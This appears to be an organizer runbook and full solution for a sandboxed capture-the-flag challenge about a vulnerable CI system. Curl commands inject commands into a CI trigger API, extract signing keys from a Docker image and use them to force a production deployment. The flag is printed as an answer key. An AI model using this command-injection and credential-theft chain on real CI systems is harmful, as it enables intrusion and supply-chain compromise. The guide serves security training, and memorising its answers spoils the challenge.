# X04 — Broken CI: Full Organizer Runbook & Solution Guide

---

### 1. Challenge Identity
- **Challenge ID:** X04
- **Challenge Name:** Broken CI
- **Category:** Git / CI / DinD / Container Registry / Deployment
- **Classification:** `SANDBOX_REQUIRED` / `HIGH_RISK`

---

### 2. Difficulty
- **Difficulty Rating:** Expert / Bonus
- **Estimated Solve Time:** 60–90 minutes

---

### 3. External Interfaces
- **TCP/80:** Web UI Dashboard & Unified REST API Gateway (`/api/git/*`, `/api/ci/*`, `/registry/v2/*`, `/api/production/*`).
- **TCP/22:** Git SSH Server for SSH cloning (`git clone git@<TARGET>:defense-network.git`).

---

### 4. Initial Git/CI Entry
1. Connect to the Gateway via browser or curl:
   ```bash
   curl -s http://<TARGET_HOST>:80/api/info
   curl -s http://<TARGET_HOST>:80/api/git/repos
   ```
2. Inspect the repository `defense-network`:
   ```bash
   curl -s http://<TARGET_HOST>:80/api/git/repos/defense-network/tree
   curl -s http://<TARGET_HOST>:80/api/git/repos/defense-network/blob/.ci/pipeline.yml
   ```
   The `.ci/pipeline.yml` reveals that builds execute automated tests, build container images via Docker daemon, and push to an internal registry (`registry.latveria.local:5000`).

---

### 5. CI Compromise
The CI system allows developers to submit pipeline build triggers with custom diagnostic hooks or arbitrary commands (`custom_command` parameter or custom pipeline script):
```bash
curl -s -X POST http://<TARGET_HOST>:80/api/ci/trigger \
     -H "Content-Type: application/json" \
     -d '{
       "repo": "latveria/defense-network",
       "branch": "main",
       "custom_command": "env"
     }'
```
The CI runner executes the command within the worker environment and captures output in the build log.

---

### 6. Inner Docker Discovery
Reviewing the environment variables and execution context from the build output reveals:
- `DOCKER_HOST=tcp://127.0.0.1:2375` (or `/tmp/dind/docker.sock`)
- `CI=true`
- `REGISTRY_HOST=registry.latveria.local:5000`

The player discovers that an isolated inner Docker-in-Docker (DinD) daemon is active and accessible.

---

### 7. Inner Daemon Interaction
Execute docker commands on the inner daemon by sending pipeline commands:
```bash
curl -s -X POST http://<TARGET_HOST>:80/api/ci/trigger \
     -H "Content-Type: application/json" \
     -d '{
       "repo": "latveria/defense-network",
       "branch": "main",
       "custom_command": "docker images"
     }'
```
Discovered cached images in inner Docker daemon:
- `latveria/ci-builder-base:latest`
- `registry.latveria.local:5000/defense/sentinel-node:v2.1.0`
- `registry.latveria.local:5000/internal/deployment-signer:v1.0.0`

---

### 8. Image Inspection / Build
Inspect the `internal/deployment-signer:v1.0.0` image to recover deployment signing secrets:
```bash
curl -s -X POST http://<TARGET_HOST>:80/api/ci/trigger \
     -H "Content-Type: application/json" \
     -d '{
       "repo": "latveria/defense-network",
       "branch": "main",
       "custom_command": "docker inspect registry.latveria.local:5000/internal/deployment-signer:v1.0.0"
     }'
```
Extracted credentials from the inner image layer / configuration:
- `SIGNER_ID`: `DOOM-DEPLOYMENT-SIGNER-04`
- `PROD_DEPLOY_SIGNING_KEY`: `latv_prod_deploy_sig_8829104820194812`
- `REGISTRY_AUTH_TOKEN`: `latv_inner_reg_secret_7719204819`

---

### 9. Registry Pivot
Query the challenge-local OCI registry (proxied via Gateway at `/registry/v2/`):
```bash
curl -s http://<TARGET_HOST>:80/registry/v2/_catalog
curl -s http://<TARGET_HOST>:80/registry/v2/defense/sentinel-node/manifests/v2.1.0
```
Verify the production image artifact `registry.latveria.local:5000/defense/sentinel-node:v2.1.0`.

---

### 10. Production Pivot
Query the production mainframe status:
```bash
curl -s http://<TARGET_HOST>:80/api/production/status
```
Notice that production deployment promotion requires cryptographic signer validation matching `DOOM-DEPLOYMENT-SIGNER-04`.

Submit the signed production deployment request:
```bash
curl -s -X POST http://<TARGET_HOST>:80/api/production/deploy \
     -H "Content-Type: application/json" \
     -d '{
       "action": "PROMOTE_TO_PRODUCTION",
       "image": "registry.latveria.local:5000/defense/sentinel-node:v2.1.0",
       "signer_id": "DOOM-DEPLOYMENT-SIGNER-04",
       "signing_key": "latv_prod_deploy_sig_8829104820194812",
       "target_cluster": "SOVEREIGN-PROD-MAINFRAME-01"
     }'
```

---

### 11. Flag Retrieval
The production mainframe validates the signing credentials, unlocks the sovereign defense core, and outputs the Flag:
```json
{
  "status": "DEPLOYMENT_GRANTED",
  "message": "Production deployment authorization verified. Sovereign defense core unlocked.",
  "deployed_image": "registry.latveria.local:5000/defense/sentinel-node:v2.1.0",
  "authorization": "SOVEREIGN_DEPLOYMENT_ROOT",
  "flag": "YUVA{d1nd_c1_runn3r_r3g1stry_pr0d_p1v0t_x04}"
}
```

---

### 12. Exact Trust Assumptions
- The CI runner executes build steps with unauthenticated parameter injection in pipeline hooks.
- The CI worker environment contains access to the inner Docker daemon (`DOCKER_HOST`).
- The inner Docker daemon contains residual image layers and deployment signing keys.
- Production promotion verifies that incoming promotion requests bear valid cryptographic signing parameters.

---

### 13. Sandbox Architecture
- Dedicated Disposable VM / microVM Sandbox (`SANDBOX_REQUIRED`).
- Exactly one inner Docker daemon per sandbox instance.
- Complete isolation from event host, outer Docker socket, and cloud metadata.

---

### 14. Reset / Teardown Procedure
Full reset triggered via `POST /api/reset` or CLI execution:
```bash
python3 challenge/snapshot/seed_state.py
```
Tears down and recreates all dynamic storage in `/tmp/x04_storage` and re-seeds all components from pristine state.

---

### 15. Resource Limits
- **CPU:** 4 vCPU limit, 500m request
- **Memory:** 4 GiB limit, 512Mi request
- **Disk:** ≤8 GiB ephemeral volume storage
- **Inner Containers:** ≤16 concurrent containers
- **Process PID limit:** 2048

---

### 16. Network Boundaries
- Public Ingress: TCP/80 (HTTP) and TCP/22 (SSH) only.
- Private Loopback: Inner daemon (2375), Registry (5000), Git HTTP (8081), CI Orchestrator (8082), Production Mock (8083).
- Egress: Default-deny (DNS UDP/TCP 53 only).
- Blocked: K8s API (6443), Kubelet (10250), Cloud Metadata (`169.254.169.254`), Outer host runtime socket.

---

### 17. Known Shortcuts
- **Direct Flag Guessing:** Flag is dynamically generated from `$FLAG` and only stored inside production memory/disk, inaccessible from Git repository or dist package.
- **Bypassing Inner Docker:** Player cannot construct the production deployment signature without discovering the signer credentials inside the inner image layers.

---

### 18. Participant Package Audit
- Participant package (`dist/`) contains exclusively `dist/README.md`.
- Zero leaks of flags, secret keys, or organizer scripts.

---

### 19. Test Results
- Clean-room Solver (`organizer/solve.py`): **PASS** (Flag recovered successfully).
- Pre-Event Adversarial Test Suite (`organizer/test_challenge.py`): **PASS** (10/10 checks passed).
- CTF Challenge Compliance Gate (`validate_challenge.py`): **PASS**.
